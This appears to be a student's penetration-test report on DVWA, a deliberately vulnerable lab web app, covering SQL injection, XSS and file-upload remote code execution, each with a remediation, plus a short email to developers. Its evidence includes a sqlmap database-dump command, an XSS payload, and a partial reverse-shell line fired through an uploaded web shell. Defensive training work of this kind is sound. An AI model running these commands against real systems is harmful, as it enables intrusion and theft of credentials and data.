
# PENETRATION TESTING EXECUTION STANDARD (PTES) REPORT
## DVWA Web Application Security Assessment
**Target:** 192.168.74.16 | **Date:** January 16, 2026 | **Analyst:** VAPT Student

## EXECUTIVE SUMMARY
Security testing of DVWA at 192.168.74.16 identified **5 critical vulnerabilities** including SQL injection, reflected XSS, and unrestricted file uploads. Attackers could extract the entire database, execute arbitrary JavaScript in users' browsers, and upload web shells for server takeover. **Immediate remediation required** within 30 days.

## SCOPE & METHODOLOGY
**In-Scope:** DVWA VM (192.168.74.16:80) web only  
**Out-of-Scope:** Network, other VMs, DoS attacks  
**Standards:** PTES 7 phases + OWASP Top 10  
**Tools:** Nmap, Burp Suite, OWASP ZAP, sqlmap, Metasploit

## KEY FINDINGS SUMMARY
| ID | Vulnerability | Severity | CVSS | Status |
|----|---------------|----------|------|--------|
| F001 | SQL Injection | Critical | 9.1 | Exploited |
| F002 | Reflected XSS | High | 8.0 | Exploited |
| F003 | File Upload RCE | Critical | 9.8 | Exploited |
| F004 | Weak Sessions | High | 7.5 | Verified |
| F005 | Outdated Components | Medium | 6.5 | Detected |

## TECHNICAL FINDINGS

### F001 - SQL Injection (Critical)
**Location:** `/dvwa/vulnerabilities/sqli/?id=1`  
**Description:** `id` parameter directly concatenated into SQL query  
**Impact:** Database enumeration + users table dump (admin:5f4dcc3b...)  
**Evidence:** `sqlmap -D dvwa -T users --dump` → 5 users extracted  
**Remediation:** Parameterized queries, prepared statements

### F002 - Reflected XSS (High)
**Location:** `/dvwa/vulnerabilities/xss_r/?name=`  
**Description:** User input reflected without encoding  
**Impact:** Session hijacking via `document.cookie` theft  
**Evidence:** `<img src=x onerror=alert(1)>` → JS execution  
**Remediation:** `htmlspecialchars()` + CSP headers

### F003 - File Upload RCE (Critical)
**Location:** `/dvwa/vulnerabilities/upload/`  
**Description:** No file validation → PHP execution  
**Impact:** Web shell upload → reverse shell to Kali  
**Evidence:** `cmd.php?cmd=bash -i >& /dev/tcp/...` → Meterpreter  
**Remediation:** MIME validation + store outside webroot

## POST-EXPLOITATION EVIDENCE
| Item | Description | Date | SHA256 Hash |
|------|-------------|------|-------------|
| passwd | /etc/passwd | 2026-01-16 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b |
| logs | apache2/access.log | 2026-01-16 | df12d594582a0309a7fabc35c99c96125ba734941c025579ad8a4edcd33cf041 |

## REMEDIATION PRIORITIES
1. **Week 1:** Patch SQLi + File Upload (Critical)
2. **Week 2:** Fix XSS + Session issues (High)  
3. **Week 4:** Update components (Medium)

## CONCLUSION
DVWA demonstrates real-world attack surface. Production systems with similar flaws face immediate compromise risk. Rescan recommended post-remediation.


# Non-Technical Summary (Mail to Dev team)

Subject: CRITICAL - XSS/SQLi/File Upload on DVWA (192.168.74.16)

Team,

Security testing found 3 CRITICAL vulnerabilities:

1. SQL Injection → Full database dump (admin:5f4dcc3b...)
2. XSS → Session hijacking capability  
3. File Upload → PHP web shell execution

IMMEDIATE FIXES REQUIRED:
- Parameterized queries for SQLi
- htmlspecialchars() + CSP for XSS
- MIME validation for uploads

Full scan reports are attached in above repository with detailed findings and step to reproduce.
Priority: URGENT
Sibin C
VAPT Analyst
